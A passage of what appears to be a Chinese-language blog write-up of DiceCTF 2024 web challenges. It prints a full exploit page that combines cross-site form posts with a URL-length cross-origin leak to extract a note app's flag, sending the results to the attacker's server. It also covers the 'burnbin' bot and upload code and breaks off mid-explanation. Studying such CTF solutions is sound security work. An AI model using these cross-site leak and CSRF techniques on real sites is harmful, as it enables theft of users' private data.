punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>當我建立長度只有 2 的 note 時，網址在限制之內，因此正常開啟新的頁面，去拿 <code>win.location.href</code> 會觸發 cross-origin 的錯誤。</p><p><img src="/img/dicectf-2024-writeup/p1.png" alt="p1"></p><p>但如果是建立長度 20000 的 note 時，重新導向的頁面網址太長，所以觸發錯誤，導致新開的頁面變成了 <code>about:blank</code>，不會觸發錯誤。</p><p><img src="/img/dicectf-2024-writeup/p2.png" alt="p2"></p><p>因此，確實可以靠著網址長度這一點，得知 note 到底有沒有建立成功。</p><p>最後的 exploit 如下：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span>  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>winForm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>inp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f_delete</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:3000/remove<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f_create</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:3000/create<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>inp2</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/hang'</span><span class="token punctuation">)</span>    win <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'about:blank'</span><span class="token punctuation">,</span> <span class="token string">'winForm'</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token string">'http://'</span><span class="token operator">+</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">2097050</span><span class="token punctuation">)</span>  <span class="token operator">+</span> <span class="token string">':def@localhost:3000'</span> <span class="token operator">+</span> <span class="token string">'/create'</span>    <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span>    <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/ping_'</span> <span class="token operator">+</span> count<span class="token punctuation">)</span>      count<span class="token operator">++</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>    <span class="token comment">// abcdefghijklmnopqrstuvwxyz</span>    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// step1. create note</span>      <span class="token keyword">let</span> testPayload <span class="token operator">=</span> <span class="token string">'dice&#123;xs'</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_1_start'</span><span class="token punctuation">)</span>      inp2<span class="token punctuation">.</span>value <span class="token operator">=</span> testPayload <span class="token operator">+</span> <span class="token string">'z'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span>      f_create<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_1_end'</span><span class="token punctuation">)</span>      <span class="token comment">// step2. delete first note</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_2_start'</span><span class="token punctuation">)</span>      f_delete<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_2_end'</span><span class="token punctuation">)</span>      <span class="token comment">// step3. leak</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_3_start'</span><span class="token punctuation">)</span>      inp<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span>      f<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_3_end'</span><span class="token punctuation">)</span>      <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span>      <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/timeout'</span><span class="token operator">+</span>count<span class="token punctuation">)</span>        count<span class="token operator">++</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> r <span class="token operator">=</span> win<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href          <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/?r='</span> <span class="token operator">+</span> r<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/err'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// err: payload is before flag</span>        <span class="token comment">// dice&#123;azzz</span>        <span class="token comment">// dice&#123;flag&#125;</span>        <span class="token comment">// about:blank, payload is after flag</span>        <span class="token comment">// dice&#123;flag&#125;</span>        <span class="token comment">// dice&#123;fzzzz&#125;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每 submit 一次，就能知道 flag 的順序在某個字元前面還後面，運用 binary search 的話，大約 submit 6 次可以知道結果，一次要等 30 秒，總共需要 3 分鐘，因為懶得自動化所以我就手動慢慢 leak 了。</p><p>大概花了 40 分鐘左右拿到 flag，不過這其實是 unintended 就是了。</p><h3><span id="預期解">預期解</span></h3><p>筆記一下 strellic 在 Discord 裡面貼的預期解法，用到了 background fetch API：</p><ol><li>install service worker and use background fetch api</li><li>this essentially causes the browser to make a download, but this download is special since it resumes on browser start</li><li>lax + post csrf a lot of img tags to purify.js, with a prefix that gets sorted against the flag (see safelist writeup for more details)</li><li>delete the first post</li><li>if your post was sorted first, it would be deleted</li><li>if it was sorted last, it would not be deleted</li><li>when the browser bot checks &#x2F;view, the browser will take longer to load the page if there are a lot of img tags</li><li>if it takes longer to load the page, the browser lasts longer and closes later</li><li>when it closes, the background fetch download stops</li><li>so, by timing how long your background fetch stays connected to your server, you can leak the outcome of the sort, and the flag</li></ol><h2><span id="webx2fburnbin-1-solve">web&#x2F;burnbin (1 solve)</span></h2><p>先講一下，這題我沒解開也沒時間看，底下是參考作者的解答寫的。</p><p>這題的類型也是類似於經典的 note app，可以註冊一個新的帳號並且建立 note，建立的時候可以上傳一張圖片。</p><p>先來看一下 bot 的部分：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> puppeteer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"puppeteer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"crypto"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">visit</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> user <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> pass <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> browser<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">headless</span><span class="token operator">:</span> <span class="token string">"new"</span><span class="token punctuation">,</span>            <span class="token literal-property property">pipe</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            <span class="token literal-property property">args</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"--no-sandbox"</span><span class="token punctuation">,</span>                <span class="token string">"--disable-setuid-sandbox"</span><span class="token punctuation">,</span>                <span class="token string">"--js-flags=--noexpose_wasm,--jitless"</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token literal-property property">dumpio</span><span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> context <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">createIncognitoBrowserContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> context<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token string">"http://localhost:3000/register"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">5000</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">'domcontentloaded'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// create new account</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">waitForSelector</span><span class="token punctuation">(</span><span class="token string">"button[type=submit]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"input[placeholder='Username']"</span><span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"input[placeholder='Password']"</span><span class="token punctuation">,</span> pass<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token string">"button[type=submit]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// create paste with flag</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"input[placeholder='Title']"</span><span class="token punctuation">,</span> <span class="token string">"Flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"textarea[placeholder='Paste contents']"</span><span class="token punctuation">,</span> <span class="token string">"Flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> imgUpload <span class="token operator">=</span> <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"input[type=file]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> imgUpload<span class="token punctuation">.</span><span class="token function">uploadFile</span><span class="token punctuation">(</span><span class="token string">"./flag.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token string">"button[type=submit]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// go to exploit page</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">5000</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">'domcontentloaded'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">30_000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        browser <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>browser<span class="token punctuation">)</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> user<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span> visit <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>會先隨機產生一組帳號密碼，註冊後上傳 flag 作為圖片，接著訪問我們的網頁。因此目標就是要偷走這張圖片，就可以拿到 flag。</p><p>這題前端在顯示 note 時，用的都是安全的顯示方式，所以沒辦法注入 HTML 等等，因此一定是要找別的方式，其中就屬上傳檔案最為可疑了：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">fastify<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>    <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">'/api/create'</span><span class="token punctuation">,</span>    <span class="token literal-property property">onRequest</span><span class="token operator">:</span> requiresLogin<span class="token punctuation">,</span>    <span class="token function-variable function">handler</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> body <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">fromEntries</span><span class="token punctuation">(</span>            Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">key</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> title<span class="token punctuation">,</span> text <span class="token punctuation">&#125;</span> <span class="token operator">=</span> body<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> title <span class="token operator">!==</span> <span class="token string">"string"</span> <span class="token operator">||</span> <span class="token keyword">typeof</span> text <span class="token operator">!==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Title or text must be string"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>title<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">32</span> <span class="token operator">||</span> text<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">512</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Title or text too long"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> id <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> paste <span class="token operator">=</span> <span class="token punctuation">&#123;</span> id<span class="token punctuation">,</span> title<span class="token punctuation">,</span> text <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> filename <span class="token operator">=</span> <span class="token function">sanitizeFilename</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>file<span class="token punctuation">.</span>filename<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> ext <span class="token operator">=</span> filename<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>filename<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token string">".png"</span><span class="token punctuation">,</span> <span class="token string">".jpeg"</span><span class="token punctuation">,</span> <span class="token string">".jpg"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>ext<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Invalid file format for image"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">const</span> buffer <span class="token operator">=</span> <span class="token keyword">await</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>file<span class="token punctuation">.</span><span class="token function">toBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">await</span> fsp<span class="token punctuation">.</span><span class="token function">mkdir</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">await</span> fsp<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            paste<span class="token punctuation">.</span>image <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>filename<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>pastes<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>paste<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">success</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上傳檔案時會檢查是否為 <code>.png</code>、<code>.jpeg</code> 或 <code>.jpg</code> 結尾，不是的話就拋出錯誤。雖然乍看之下只能上傳圖片，但如果上傳檔名是 <code>.png</code> 